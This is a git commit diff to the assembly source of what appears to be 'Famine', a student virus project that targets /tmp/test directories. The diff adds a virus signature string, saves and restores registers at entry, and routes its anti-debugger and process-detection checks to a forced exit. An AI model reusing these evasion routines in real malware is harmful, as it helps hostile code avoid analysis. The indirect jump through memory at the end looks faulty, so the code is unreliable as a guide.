1f15b896fbdc83c2adfa97f538381ac81a925b02
Razvan Ludosanu <r.ludosanu@gmail.com>
2018-03-07 13:09:28 +0000

    Push all registers instructions added

--- main.s
+++ main.s
@@ -21,19 +21,40 @@ _dirname_2:
 	.string db '/tmp/test2', 0
 	.length equ $ - _dirname_2.string
 
+_signature:
+	.string db 'Famine version 1.0 (c)oded by cdrouet-rludosan', 0
+	.length equ $ - _signature.string
+
 ;; -----------------------------------------------------------------------------------
 ;; Main entry point
 ;; -----------------------------------------------------------------------------------
 _start:
+	enter	16, 0
+
+_push_all_regs:
+	push	rbx
+	push	rcx
+	push	rdx
+	push	rsi
+	push	rdi
+	push	r8
+	push	r9
+	push	r10
+	push	r11
+	push	r12
+	push	r13
+	push	r14
+	push	r15
+
 	;; Check if program was launched into debugger
 	call	_checkdbg
 	cmp		rax, 1
-	je		_end
+	je		_force_exit
 
 	;; Check if specific program is running
 	call	_checkproc
 	cmp		rax, 1
-	je		_end
+	je		_force_exit
 	
 	;; Copy /tmp/test path under %rsp
 	lea		rsi, [rel _dirname_1.string]
@@ -81,7 +102,27 @@ _start:
 	add		rsp, _dirname_2.length
 	add		rsp, 1
 
-_end:
+_pop_all_regs:
+	;; Pop off the stack all the registers
+	pop		r15
+	pop		r14
+	pop		r13
+	pop		r12
+	pop		r11
+	pop		r10
+	pop		r9
+	pop		r8
+	pop		rdi
+	pop		rsi
+	pop		rdx
+	pop		rcx
+	pop		rbx
+	leave
+	
+	lea		rax, [rel _force_exit]
+	jmp		[rax]
+
+_force_exit:
 	mov		rax, 60
 	mov		rdi, 0
 	syscall
